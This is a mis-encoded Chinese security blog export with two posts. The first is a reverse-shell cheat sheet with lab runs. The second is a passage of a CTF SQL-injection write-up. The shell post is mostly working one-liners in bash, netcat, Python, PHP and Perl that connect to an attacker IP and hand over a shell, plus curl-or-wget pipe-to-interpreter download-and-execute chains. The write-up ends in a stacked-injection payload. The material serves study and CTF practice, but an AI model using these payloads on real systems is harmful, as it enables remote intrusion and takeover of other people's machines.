<h1 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h1><p>åå‘ShellæŒ‡Shellå›å¼¹æˆ–è€…å«åå°„ï¼Œå°±æ˜¯è¯´å—å®³è€…kaliæŠŠè‡ªå·±çš„ShellæŒ‚è½½ï¼ˆæˆ–è€…å«attachæ›´åˆé€‚ï¼‰åˆ°æŸä¸ªç«¯å£ä¸Šï¼Œä»¥æ­¤æš´éœ²åˆ°æ”»å‡»è€…winå¯ä»¥è¿æ¥çš„ä½ç½®ï¼Œæ”»å‡»è€…winé€šè¿‡è¿æ¥è¯¥ç«¯å£æœ€ç»ˆæ‹¿åˆ°shellã€‚</p>
<p><strong>ä»¥ä¸‹å®éªŒéƒ½ä¸º</strong></p>
<p><strong>kaliä¸ºè¢«æ”»å‡»è€…æ¥æ¨¡ä»¿æœåŠ¡å™¨</strong></p>
<p><strong>winä¸ºæ”»å‡»è€…</strong></p>
<p>kaliï¼ˆæœåŠ¡ç«¯ï¼‰ï¼š192.168.202.129</p>
<p>winï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼š169.254.158.23</p>
<h2 id="bashåå¼¹shell"><a href="#bashåå¼¹shell" class="headerlink" title="bashåå¼¹shell"></a><strong>bashåå¼¹shell</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/169.254.158.23/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒè®©æœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸ç›®æ ‡ä¸»æœº8080ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 8080 ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ªtcp 8080ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªbash åå¼¹ç¯å¢ƒã€‚</p>
<h3 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a><strong>å®éªŒ</strong></h3><p>é¦–å…ˆåœ¨winä¸Šç›‘å¬8080ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-n: ä¸åå‘è§£ædnsï¼Œå³ä¸é€šè¿‡ipè§£æåŸŸå no dns</p>
<p>-v: è¯¦ç»†ä¿¡æ¯è¾“å‡º verbose</p>
<p>-l:  ç›‘å¬ listen</p>
<p>-p: æŒ‡å®šç«¯å£ port</p>
</blockquote>
<p>ç„¶åå†kaliä¸Šè¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>ä¹‹ååå¼¹æˆåŠŸ</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205548782.png" alt="image-20201002205548782"></p>
<h3 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h3><p>å…·ä½“å„å‚æ•°çš„æ„ä¹‰</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205958997.png" alt="image-20201002205958997"></p>
<p><strong>linuxæ–‡ä»¶æè¿°ç¬¦</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 - stdin ä»£è¡¨æ ‡å‡†è¾“å…¥,ä½¿ç”¨&lt;æˆ–&lt;&lt;</span><br><span class="line">1 - stdout ä»£è¡¨æ ‡å‡†è¾“å‡º,ä½¿ç”¨&gt;æˆ–&gt;&gt;</span><br><span class="line">2 - stderr ä»£è¡¨æ ‡å‡†é”™è¯¯è¾“å‡º,ä½¿ç”¨2&gt;æˆ–2&gt;&gt;</span><br></pre></td></tr></table></figure>
<p><strong>>&amp;</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æ—¶ï¼Œè¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘è‡³æ–‡ä»¶ã€‚</span><br><span class="line">å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œè¡¨ç¤ºå°†å‰é¢çš„æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘è‡³åé¢çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&amp;å’Œ&gt;çš„åŒºåˆ«</span></span><br><span class="line">root@kali:/var/www/html# ls  //æŸ¥çœ‹æ— 1.php</span><br><span class="line">flag.php  index.php</span><br><span class="line">root@kali:/var/www/html# cat 1.php 2&gt;1  //å°†é”™è¯¯å†…å®¹è¾“å…¥åˆ°1æ–‡ä»¶ä¸­</span><br><span class="line">root@kali:/var/www/html# cat 1</span><br><span class="line">cat: 1.php: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">root@kali:/var/www/html# cat 1.php 2&gt;&amp;1  //å°†é”™è¯¯å†…å®¹æŒ‰æ ‡å‡†è¾“å‡ºå‡ºæ¥</span><br><span class="line">cat: 1.php: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure>
<ol>
<li>bash -i äº§ç”Ÿä¸€ä¸ªbashç¯å¢ƒ</li>
<li><code>/dev/tcp/ip/port</code>ï¼š <code>/dev/tcp/</code>æ˜¯Linuxä¸­çš„ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡,æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œ&gt;&amp;åé¢è·Ÿä¸Š<code>/dev/tcp/ip/port</code>è¿™ä¸ªæ–‡ä»¶ä»£è¡¨å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¼ é€’åˆ°è¿œç¨‹ä¸Šï¼Œå¦‚æœè¿œç¨‹å¼€å¯äº†å¯¹åº”çš„ç«¯å£å»ç›‘å¬ï¼Œå°±ä¼šæ¥æ”¶åˆ°è¿™ä¸ªbashçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚</li>
<li><code>0&gt;&amp;1</code>ï¼Œä»£è¡¨å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œè¿™é‡Œçš„æ ‡å‡†è¾“å‡ºå·²ç»é‡å®šå‘åˆ°äº†<code>/dev/tcp/ip/port</code>è¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹ï¼Œé‚£ä¹ˆæ ‡å‡†è¾“å…¥ä¹Ÿå°±é‡å®šå‘åˆ°äº†è¿œç¨‹ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç›´æ¥åœ¨è¿œç¨‹è¾“å…¥äº†</li>
</ol>
<h2 id="ncä¸€å¥è¯åå¼¹"><a href="#ncä¸€å¥è¯åå¼¹" class="headerlink" title="ncä¸€å¥è¯åå¼¹"></a>ncä¸€å¥è¯åå¼¹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-e: æŒ‡å®šncè¿æ¥æˆåŠŸåæ‰§è¡Œçš„ç¨‹åº</p>
</blockquote>
<p>æ— -eçš„æƒ…å†µä¸‹å¯ä»¥æ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure>
<h3 id="å®éªŒ1"><a href="#å®éªŒ1" class="headerlink" title="å®éªŒ1"></a><strong>å®éªŒ</strong>1</h3><p>é¦–å…ˆåœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šç›‘å¬7777ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šä¸€å¥è¯åå¼¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>åå¼¹æˆåŠŸ</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002211246793.png" alt="image-20201002211246793"></p>
<h3 id="å®éªŒ2"><a href="#å®éªŒ2" class="headerlink" title="å®éªŒ2"></a>å®éªŒ2</h3><p>winä¸Šç›‘å¬ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>kaliä¸Šæ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003140303187.png" alt="image-20201003140303187"></p>
<p>åå¼¹æˆåŠŸ</p>
<h2 id="curlåå¼¹"><a href="#curlåå¼¹" class="headerlink" title="curlåå¼¹"></a>curlåå¼¹</h2><p>å‰æè¦åˆ©ç”¨bashä¸€å¥è¯çš„æƒ…å†µä¸‹ä½¿ç”¨curlåå¼¹shell</p>
<p>kaliä¸Šindexæ–‡ä»¶ä¸Šå«æœ‰bashä¸€å¥è¯ï¼Œå°±å¯ä»¥åå¼¹shellã€‚</p>
<h3 id="å®éªŒ-1"><a href="#å®éªŒ-1" class="headerlink" title="å®éªŒ"></a><strong>å®éªŒ</strong></h3><p>kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šæ£€æŸ¥æ˜¯å¦æœ‰bashä¸€å¥è¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl 192.168.202.129</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>åœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šç›‘å¬ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨æœåŠ¡ç«¯curlåå¼¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl 192.168.202.129|bash</span><br></pre></td></tr></table></figure>
<p>åå¼¹æˆåŠŸ</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002225540094.png" alt="image-20201002225540094"></p>
<h2 id="wgetåå¼¹"><a href="#wgetåå¼¹" class="headerlink" title="wgetåå¼¹"></a>wgetåå¼¹</h2><p>å…¶å®æ˜¯åˆ©ç”¨wgetå’Œphpè„šæœ¬ä¸€å—æ‰§è¡Œè¾¾åˆ°åå¼¹</p>
<h3 id="å®éªŒ-2"><a href="#å®éªŒ-2" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h3><p>é¦–å…ˆåœ¨winï¼ˆåº”è¯¥åœ¨ä»»ä½•ä¸€å°æœåŠ¡å™¨ä¸Šä¹Ÿè¡Œï¼‰ä¸Šæœ‰shell.txtï¼Œå†™å…¥ä»¥ä¸‹phpå†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"localhost"</span>,<span class="number">12345</span>);<span class="comment">//localhostä¸ºè‡ªå·±çš„ip</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å…ˆåœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šç›‘å¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>åœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šåˆ©ç”¨wgetä¸‹è½½shell.txtï¼Œç„¶åæ‰§è¡Œphp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget 169.254.158.23:8888&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php</span><br></pre></td></tr></table></figure>
<p>åå¼¹æˆåŠŸ</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002232826494.png" alt="image-20201002232826494"></p>
<h2 id="pythonåå¼¹"><a href="#pythonåå¼¹" class="headerlink" title="pythonåå¼¹"></a>pythonåå¼¹</h2><p>åˆ©ç”¨curl</p>
<p>ä½†è¿™æ¬¡ç”¨çš„æ˜¯pyè„šæœ¬</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(("169.254.158.23",7777)) #æ›´æ”¹localhostä¸ºè‡ªå·±çš„ip,ç«¯å£ä»»æ„</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call(["/bin/sh","-i"])</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("169.254.158.23",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span><br></pre></td></tr></table></figure>
<p>æ•ˆæœæ˜¯ä¸€æ ·çš„</p>
<h3 id="å®éªŒ1-1"><a href="#å®éªŒ1-1" class="headerlink" title="å®éªŒ1"></a>å®éªŒ1</h3><p>é¦–å…ˆåœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šå†™ä¸‹pyè„šæœ¬</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(("169.254.158.23",7777)) #æ›´æ”¹localhostä¸ºè‡ªå·±çš„ip,ç«¯å£ä»»æ„</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call(["/bin/sh","-i"])</span><br></pre></td></tr></table></figure>
<p>winï¼ˆå®¢æˆ·ç«¯ï¼‰ç›‘å¬</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">7777</span></span><br></pre></td></tr></table></figure>
<p>kaliï¼ˆæœåŠ¡ç«¯ï¼‰curl</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 192.168.202.129/shell.py|python</span><br></pre></td></tr></table></figure>
<p>åå¼¹æˆåŠŸ</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003131626423.png" alt="image-20201003131626423"></p>
<h3 id="å®éªŒ2-1"><a href="#å®éªŒ2-1" class="headerlink" title="å®éªŒ2"></a>å®éªŒ2</h3><p>åœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ç›‘å¬ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>åœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰è¾“å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;169.254.158.23&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
<p>åå¼¹æˆåŠŸ</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133539912.png" alt="image-20201003133539912"></p>
<h2 id="phpåå¼¹"><a href="#phpåå¼¹" class="headerlink" title="phpåå¼¹"></a>phpåå¼¹</h2><p>å’Œpythonä¸€æ ·åˆ©ç”¨curl</p>
<p>phpè„šæœ¬å¦‚ä¸‹ï¼Œå’Œä¸Šé¢çš„shell.txtä¸€æ ·çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"169.254.158.23"</span>,<span class="number">7777</span>);<span class="comment">//localhostä¸ºè‡ªå·±çš„ipï¼Œç«¯å£ä»»æ„</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("169.254.158.23",7777);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
<h3 id="å®éªŒ1-2"><a href="#å®éªŒ1-2" class="headerlink" title="å®éªŒ1"></a>å®éªŒ1</h3><p>é¦–å…ˆåœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰å†™ä¸‹phpè„šæœ¬ï¼Œå­˜ä¸ºshell.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"169.254.158.23"</span>,<span class="number">7777</span>);<span class="comment">//localhostä¸ºè‡ªå·±çš„ipï¼Œç«¯å£ä»»æ„</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ç›‘å¬ç«¯å£</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">7777</span></span><br></pre></td></tr></table></figure>
<p>kaliï¼ˆæœåŠ¡ç«¯ï¼‰curlåå¼¹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 192.168.202.129/shell.txt|php</span><br></pre></td></tr></table></figure>
<p>åå¼¹æˆåŠŸ</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003132843970.png" alt="image-20201003132843970"></p>
<h3 id="å®éªŒ2-2"><a href="#å®éªŒ2-2" class="headerlink" title="å®éªŒ2"></a>å®éªŒ2</h3><p>winä¸Šç›‘å¬ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
<p>kaliä¸Šæ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("169.254.158.23",7777);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
<p>åå¼¹æˆåŠŸ</p>
<p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133806050.png" alt="image-20201003133806050"></p>
<h2 id="perlåå¼¹"><a href="#perlåå¼¹" class="headerlink" title="perlåå¼¹"></a>perlåå¼¹</h2><p>å’Œä¸Šé¢å‡ ä¸ªåå¼¹ä¸€æ ·</p>
<p>è¿™é‡Œåªåšä¸€ä¸‹æ¼”ç¤º</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl -e 'use Socket;$i="169.254.158.23";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="å®éªŒ-3"><a href="#å®éªŒ-3" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h3><p>åœ¨winä¸Šç›‘å¬ç«¯å£</p>
<p>åœ¨kaliä¸Šæ‰§è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl -e 'use Socket;$i="169.254.158.23";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span><br></pre></td></tr></table></figure>
<p>åå¼¹æˆåŠŸ</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä»¥ä¸Šéƒ½æ˜¯æœ€åŸºæœ¬çš„åå¼¹shell</p>
<p>å…¶å®åå¼¹shellè¿˜æ˜¯å¾ˆçµæ´»çš„ï¼Œå…·ä½“ä»€ä¹ˆæ ·çš„åœºæ™¯ä¸‹æ€ä¹ˆç”¨è¿˜éœ€è¦è‡ªå·±åˆ¤æ–­</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>åå¼¹shell</tag>
        <tag>æ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUåˆ·é¢˜(Web)</title>
    <url>/2020/09/27/BUU%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="BUU-Web"><a href="#BUU-Web" class="headerlink" title="BUU(Web)"></a>BUU(Web)</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å…¶å®è‡ªå·±ä¼šåšå®Œé¢˜å†™ä¸€äº›wpï¼Œä½†å¥ˆä½•è‡ªå·±ä¸‰å¤©æ‘¸é±¼ä¸¤å¤©ä¼‘æ¯ï¼Œæ‰€ä»¥ä¸Šä¼ ä¸Šæ¥ç›‘ç£è‡ªå·±å­¦ä¹ </p>
<p>é¡ºä¾¿åˆ†ä¸€ä¸‹ç±»</p>
<h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨ï¼ˆå †å æ³¨å…¥ï¼‰"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨ï¼ˆå †å æ³¨å…¥ï¼‰" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ï¼ˆå †å æ³¨å…¥ï¼‰"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ï¼ˆå †å æ³¨å…¥ï¼‰</h2><blockquote>
<p>å †å æ³¨å…¥ï¼š</p>
<p>åˆ†å·ï¼ˆï¼›ï¼‰æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚ç»“æŸä¸€ä¸ªsqlè¯­å¥å†ç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œå¯ä»¥ä¸€èµ·æ‰§è¡Œã€‚å †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚</p>
</blockquote>
<p>å…ˆæ¥äº†è§£ä¸€ä¸‹å †å æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; #</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; union select 1,2#</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823154827319.png" alt="image-20200823154827319"></p>
<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¤§å¤šæ•°è¯­å¥ï¼Œä½†æˆ‘ä»¬è¿˜æœ‰showï¼Œalertï¼Œrenameï¼Œdescç­‰</p>
<p>é€šè¿‡çœ‹è¡¨å¯ä»¥çœ‹è§ä¸¤ä¸ªè¡¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;desc words;#</span><br></pre></td></tr></table></figure>
<p>wordsè¡¨</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823155250757.png" alt="image-20200823155250757"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;desc &#96;1919810931114514&#96;;#  &#x2F;&#x2F;åœ¨mysqlä¸­æ•°å­—å‹éœ€è¦&#96;&#96;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823180812053.png" alt="image-20200823180812053"></p>
<p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å°±æ‰¾è§äº†flagï¼Œä½†é—®é¢˜æ˜¯æ€ä¹ˆæ‹¿å‡ºflagå‘¢ï¼Ÿ</p>
<p>ä¸‹é¢æ“ä½œæ˜¯éªšå§¿åŠ¿ï¼š</p>
<p>ä¸»è¦æ€æƒ³æ˜¯åˆ©ç”¨å›æ˜¾ä½ç½®æ¥å€’é€€è·å–flagï¼Œå›æ˜¾è‚¯å®šæ˜¯idåˆ°wordsè¡¨é‡Œé¢æ‰¾æ•°æ®ï¼Œç„¶åå›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æŸ¥è¯¢è¯­å¥ä¸å˜çš„å‰æä¸‹ï¼Œå°†flagå›æ˜¾å‡ºæ¥ï¼Ÿ</p>
<ul>
<li>æŠŠwordsè¡¨æ”¹åï¼ŒæŠŠæ•°å­—è¡¨æ”¹ä¸ºwordsï¼›</li>
<li>å¾€æ–°wordsè¡¨é‡Œé¢æ’å…¥ä¸€ä¸ªidå‚æ•°ï¼Œè¿™æ ·å›æ˜¾å°±å¯ä»¥æ‰¾åˆ°idï¼Œä»è€Œæ˜¾ç¤ºå‡ºflag</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select id,data from words where id&#x3D;&#39;id&#39;;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥flagè¿˜å¾—æ”¹æˆdata</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823191000126.png" alt="image-20200823191000126"></p>
<p><strong>å¤ä¹ ä¸€ä¸‹mysqlæ“ä½œ</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#è¡¨é‡å‘½å</span><br><span class="line">rename table o_name to n_name;</span><br><span class="line">#æ–°å¢å­—æ®µ</span><br><span class="line">alert table table_name add column_name [type];</span><br><span class="line">#ä¿®æ”¹å­—æ®µå</span><br><span class="line">alert table table_name change o_name n_name [type];</span><br></pre></td></tr></table></figure>
